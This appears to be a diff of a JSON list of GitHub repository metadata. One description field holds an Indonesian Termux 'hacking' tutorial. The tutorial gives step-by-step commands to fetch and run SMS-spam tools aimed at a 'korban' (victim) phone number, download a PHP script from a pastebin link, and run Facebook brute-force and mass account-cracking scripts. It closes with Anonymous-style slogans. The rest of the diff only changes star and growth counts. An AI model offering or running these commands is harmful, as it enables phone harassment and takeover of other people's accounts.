http://files-store.theprivat.ml/uploads/bombtsel.txt > bombtsel.php  $ chmod 777 bombtsel.php $ php bombtsel.php 3) Tool Spam LITESPAM $ pkg install php $ pkg install toilet $ pkg install sh  LITESPAM $ pkg install git $ git clone https://github.com/4L13199/LITESPAM $ cd LITESPAM $ sh LITESPAM.sh atau  bash LITESPAM.sh Masukan Nomer nya...   Spammer GRAB $pkg install python2 $pip2 install requests $pkg install git $git clone http://github.com/p4kl0nc4t/Spammer-Grab $cd Spammer-Grab $python2 spammer.py nomor hp korban --delay 30  spam sms jdid 1.PKG install PHP 2.pkg install cURL 3.curl https://pastebin.com/raw/9BYy1 JVc -o jdid.php 4.php jdid.php   Hacking spammer by seni $apt update && apt upgrade $apt install python2 php $pip2 install requests $apt install nano $apt install git $git clone https://github.com/Senitopeng/ SpamSms.git $cd SpamSms $python2 mantan.py   HACKING DAN TRICK FB VIA TERMUX   AUTO BOOT FACEBOOK  $ git clone https://github.com/Senitopeng/BotFbBangDjon.git $ cd BotFbBangDjon $ python2 bangdjon.py  Cara crack id fb  https://findmyfbid.in/  git clone https://github.com/tomiashari/fb-autoreaction.git cd fb-autoreaction python2 fb-autoreaction  HACKING THOOLS MBF FACEBOOK $ pkg update && upgrade ‬$ pkg update && upgrade $ pkg install python2 $ pkg install git $ git clone https://github.com/pirmansx/mbf $ cd mbf $ python2 MBF.py  (HACKING FB LEWAT TERMUX) $ apt update $ apt upgrade  $ apt install python2 $ apt install python2-dev $ apt install wget $ dip2 install mechanize $ cd/sterage/emulated/0 $ python2 fbbrute.py ( yg tdi di download di tunda di luar folder )  Mungkin itu saja yang dapat saya bagikan, jika ada yang salah saya mohon maaf. Ingin Ikut Team Kami ? Klik Disini Website Team ? Klik Disini Website Umum ? Klik Disini  Di Atas Langit Masih Ada Langit Jadi, Jangan Sok Berkuasa Belum Tentu Anda Lebih Baik Dari Kami #WeDoNotForget #WeDoNotForgive #ExpectUs  Landy22  Salam Hangat,",
-    "stars": 770,
+    "stars": 771,
     "forks": 143,
     "language": "Python",
     "topics": [],
     "created_at": "2020-05-27T04:41:24Z",
     "pushed_at": "2020-06-25T05:55:12Z",
-    "growth": 0
+    "growth": 1
   },
   {
     "full_name": "PAICNI/CFBox",
     "html_url": "https://github.com/PAICNI/CFBox",
     "description": "一个运行在 Cloudflare Workers 上兼容CFnew 与edgetunnel的代理订阅管理面板——既能在 /UUID 路径上输出 VLESS/Trojan/xhttp 多协议订阅，又提供图形化配置界面（KV 存储、改完即生效），并内置延迟测试、流媒体/AI 连通性检测、多客户端订阅生成、多语言等能力。",
-    "stars": 682,
+    "stars": 681,
     "forks": 681,
     "language": "JavaScript",
     "topics": [],
     "created_at": "2026-08-26T21:58:54Z",
     "pushed_at": "2026-09-01T19:43:27Z",
-    "growth": 0
+    "growth": -1
   }
 ]
